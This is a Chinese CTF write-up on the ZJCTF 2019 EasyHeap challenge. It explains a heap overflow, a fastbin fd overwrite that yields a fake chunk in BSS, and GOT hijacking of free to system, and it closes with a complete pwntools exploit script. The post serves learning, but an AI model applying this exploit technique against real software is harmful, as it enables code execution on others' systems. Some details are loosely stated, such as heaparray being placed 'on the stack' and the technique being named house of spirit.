---
title: 常见fastbin attack套路学习
date: 2020-04-25 00:06:30
tags:
---
今天做了一个我认为很经典的题目，应该算是对fastbin attack有了更深刻的理解了，之前一直是模模糊糊的概念，不大懂  <!--more-->
```  
本文引用了其他师傅博客的原文，如有侵权请联系我删除  
```  
直接上题目，在题目里穿插知识点  
## [ZJCTF 2019]EasyHeap  
分析代码  
存在如下功能：  
```  
1.add
2.edit
3.free
4.exit
```  
main函数不贴了，长得和hitcontrainning的magicheap几乎一样  
```C++  
unsigned __int64 create_heap()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      printf("Size of Heap : ");
      read(0, &buf, 8uLL);
      size = atoi(&buf);
      heaparray[i] = malloc(size);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:", &buf);
      read_input(heaparray[i], size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```  
```C++  
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    free(heaparray[v1]);
    heaparray[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```  
```C++  
unsigned __int64 edit_heap()
{
  size_t v0; // ST08_8
  int v2; // [rsp+4h] [rbp-1Ch]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v2 = atoi(&buf);
  if ( v2 < 0 || v2 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v2] )
  {
    printf("Size of Heap : ", &buf);
    read(0, &buf, 8uLL);
    v0 = atoi(&buf);
    printf("Content of heap : ", &buf);
    read_input(heaparray[v2], v0);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```  
heaparray是在栈上的，起始地址是0x6020e0，意思是堆指针都存在BSS段上  
edit函数存在任意字节溢出  
free之后指针置零，不存在UAF  
没有show函数，不能leak libc，但是程序中存在system函数，我们只要想办法把free_got改成system_plt，然后free一个已经写入了/bin/sh的chunk，就能getshell了  
那我们要改got表里面的内容，就需要有一块指针为free_got的chunk  
chunk指针都是存在bss段上的，我们只要将bss段上对应位置的chunk指针改成free_got就行  
这里用到的攻击方式是house of spirit，利用fastbin和堆溢出，把在fastbin链尾的堆块的fd指针（正常情况下是0x0）改写为我们精心构造的fake chunk的地址，注意这个地址要在0x6020e0前面找，这样我们malloc到fake chunk之后，（malloc到fake chunk的意思就是，add一块以我们指定地址为chunk指针的chunk）通过edit就能向下覆写堆块指针。  
经过踩在巨人的肩膀上眺望，发现可以构造一个大概长这样的    
![](fk1.png)
```  
如果从fastbins中malloc一个freechunk时，glibc会做以下两个检测：

检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50，那么就会程序就报错退出）
检测2：检测你这个freechunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测


可以利用以下技巧：  

技巧①：我们malloc的时候，尽量malloc一个大小在0x70~0x80之间的堆块（因此malloc的参数要为0x60~0x70之间），因为这样我们的目标地址就会被放入0x70~0x80大小范围的fastbin链中，此时我们去构造堆块的时候，由于系统中0x7f这样的数值比较好找，所以能够构造0x7f这样的数值来跳过glibc的检测

技巧②：接着技巧①，如果此时我们没有数值为0x7f这样的地址来让我们构造，那么我们就需要使用借助unsortedbin attack了，利用unsortedbin attack向我们的目标地址处写入一个0x7f的数值
```  
引用自：https://blog.csdn.net/qq_41453285/article/details/99315504  
之前做过一个题，需要add两次add到想要的地址，这里也是一样的  
add之前，bins里长这样  
![](fk2.png)
然后add两次就能有一块以0x6020ad为指针的chunk了  
add到0x6020ad之后，那个地址大概长这样  
![](fk3.png)
然后我们从这个地址可控地址开始，也就是0x6020c0(0x6020ad+0x10(chunk头)+3)开始向下写，改掉chunk0的指针  
改掉之后，长这样  
![](fk5.png)
然后把chunk0的内容改成system_plt，就能达到改free_got的效果了  
![](fk6.png)
## exp  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
from LibcSearcher import *
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './easyheap' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",25249)
elf=ELF(binary)
libc=elf.libc
def add(size,content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("Heap : ")
    p.sendline(str(size))
    p.recvuntil("heap:")
    p.send(content)
def edit(index,size,content):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))
    p.recvuntil("Heap : ")
    p.sendline(str(size))
    p.recvuntil("heap : ")
    p.send(content)
def free(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(str(index))
def exp():
    add(0x68,"aaaa") # 0
    add(0x68,"bbbb") # 1
    add(0x68,"cccc") # 2
    free(2)
    payload = "/bin/sh\x00" + "a"*0x60 + p64(0x71) + p64(0x6020b0-3)
    edit(1,len(payload),payload)
    add(0x68,"fuck") # 2
    payload = "a"*3 + p64(0)*4 + p64(elf.got['free'])
    add(0x68,payload)
    payload = p64(elf.plt['system'])
    edit(0,len(payload),payload)
    free(1)
    gdb.attach(p)
    
    p.interactive()
exp()
```  
这个题可谓经典之至，让我加深了对fastbin attack的理解，检测机制，学习了house of spirit  
参考链接：  
https://blog.csdn.net/BengDouLove/article/details/105391153  
https://blog.csdn.net/qq_41453285/article/details/99315504  
https://blog.csdn.net/qq_41453285/article/details/99329694